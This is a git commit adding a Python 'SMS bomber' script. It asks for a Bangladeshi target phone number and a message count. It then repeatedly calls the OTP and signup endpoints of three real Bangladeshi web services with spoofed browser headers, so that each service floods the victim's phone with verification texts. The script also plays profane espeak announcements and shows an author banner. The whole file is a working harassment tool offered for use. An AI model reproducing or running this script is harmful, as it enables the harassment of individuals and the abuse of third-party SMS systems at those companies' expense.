cce5cda2e2ac78fce55f5d846f88a6021711b88a
Oxt4n1nc9b4r <150040423+Oxt4n1nc9b4r@users.noreply.github.com>
2023-11-06 19:31:06 +0600

    Sms Bomber.py

---
+++ Sms Bomber.py
@@ -0,0 +1,117 @@
+import os
+print("\033[1;92m [[[😈]][[😈]][[😈]][[😈]][[😈]][[😈]][[😈]][[😈]][[😈]]] TOOLS INSTALLLING PLEASE WAIT. . . . \033[1;30m")
+os.system("pkg install espeak")
+print("\033[1;92m   [[[😈 ]][[😈]][[😈]][[😈]][[😈]][[😈]][[😈]][[😈]][[😈]]] TOOLS INSTALL COMPLETE \033[1;30m")
+os.system('espeak -a 300 "Robot install complete"')
+print("\033[1;92m   [[[😈]][[😈]][[😈]][[😈]][[😈]][[😈]][[😈]][[😈]][[😈]]] UPDATE CHECKING DONE\033[1;30m")
+os.system('espeak -a 300 " WELCOME TO Tanin CYBER WORLD  "')
+os.system('espeak -a 300 "Fuck You "')
+os.system('espeak -a 300 "Author T4N1N "')
+os.system("git pull")
+import os,requests,time
+time.sleep(1)
+os.system("clear")
+os.system("xdg-open https://youtu.be/raS1F1ex7Ms?feature=shared")
+logo3="""
+
+░░░░░░░░░░░░░░░▄▄░░░░░░░░░░░
+░░░░░░░░░░░░░░█░░█░░░░░░░░░░
+░░░░░░░░░░░░░░█░░█░░░░░░░░░░
+░░░░░░░░░░░░░░█░░█░░░░░░░░░░
+░░░░░░░░░░░░░░█░░█░░░░░░░░░░
+██████▄███▄████░░███▄░░░░░░░
+▓▓▓▓▓▓█░░░█░░░█░░█░░░███░░░░
+▓▓▓▓▓▓█░░░█░░░█░░█░░░█░░█░░░
+▓▓▓▓▓▓█░░░░░░░░░░░░░░█░░█░░░
+▓▓▓▓▓▓█░░T4N1N - C9B4R░░░░█░░░
+▓▓▓▓▓▓█░░░░░░░░░░░░░░██░░░░░
+▓▓▓▓▓▓█████░░░░░░░░░██░░░░░░
+
+──▄────▄▄▄▄▄▄▄────▄───
+─▀▀▄─▄█████████▄─▄▀▀──
+─────██─▀███▀─██──────
+───▄─▀████▀████▀─▄────
+─▀█────██▀█▀██────█▀──
+                                   
+\033[1;39m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mT4N1N-𝟰𝟰𝟰\033[1;39m━━━━━━━━━━━━━━━━━━━━┓
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\033[1;34m        : [★]T4N1N C9B4R\033[1;39m         ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★]T4N1N C9B4R\033[1;39m         ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\033[1;34m      : [★]T4N1N-𝟰𝟰𝟰-𝗖𝟵𝗕𝟰𝗥\033[1;39m       ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\033[1;34m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\033[1;39m        ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\033[1;34m    : [★]+8801754628811\033[1;39m     ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\033[1;34m  : [★]𝗦𝗠𝗦 𝗕𝗢𝗢𝗠𝗕𝗘𝗥\033[1;39m     ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\033[1;34m: [★]𝗙𝗥𝗘𝗘\033[1;39m            ┃
+ \033[1;39m    ┗━━━━━━━━━━━━━━━━━━━\033[1;31𝗖𝟵𝗕𝟰𝗥\033[1;39m━━━━━━━━━━━━━━━━━━━━┛"""
+os.system('espeak -a 300 "Author T4N1N C9B4R "')
+os.system('espeak -a 300 "Facebook  T4N1N C9B4R "')
+os.system('espeak -a 300 "Whathapp ****"')
+os.system('espeak -a 300 "Github T4N1N - 𝗖𝟵𝗕𝟰𝗥 "')
+os.system('espeak -a 300 "Telegram ******"')
+os.system('espeak -a 300 "Imo ********"')
+os.system('espeak -a 300 "From Bangladesh "')
+os.system('espeak -a 300 "Fuck You "')
+os.system('espeak -a 300 "Fuck You "')
+print(logo3)
+num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
+amount=int(input("\n  \033[38;5;46mSMS AMOUNT : "))
+headers1={
+			  "authority":"www.bioscopelive.com",
+			  "method":"GET",
+			  "scheme":"https",
+			  "accept":"*/*",
+			  "accept-encoding":"gzip, deflate, br",
+			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
+			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
+			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
+			  "save-data":"on",
+			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
+			  "sec-ch-ua-mobile":"?1",
+			  "sec-ch-ua-platform":'Android',
+			  "sec-fetch-dest":"empty",
+			  "sec-fetch-mode":"cors",
+			  "sec-fetch-site":"same-origin",
+			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+			  "x-requested-with":"XMLHttpRequest"
+}
+url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
+headers2={
+         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
+         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
+data={
+  "name": num,
+  "phoneNumber": num,
+  "service": "redx"
+}
+headers3={
+  "referer":"https://redx.com.bd/",
+  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+ses=0
+while amount>ses:
+  sent1=requests.get(url1,headers=headers1)
+  if sent1.status_code==200:
+    ses+=1
+    print(f"\n{ses}  \033[38;5;46mT4N1N-𝟰𝟰𝟰-𝗖𝟵𝗕𝟰𝗥 SMS WAS SENT DONE😈")
+  else:
+    pass
+  
+  sent2=requests.get(url2,headers=headers2)
+  if sent2.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46mT4N1N-𝟰𝟰𝟰-𝗖𝟵𝗕𝟰𝗥 SMS WAS SENT DONE😈")
+  else:
+    pass
+  
+  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
+  if send3.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46T4N1N-𝟰𝟰𝟰-𝗖𝟵𝗕𝟰𝗥 SMS WAS SENT DONE😈")
+    
+  else:
+    pass
+os.system("clear")
+
+
+                            
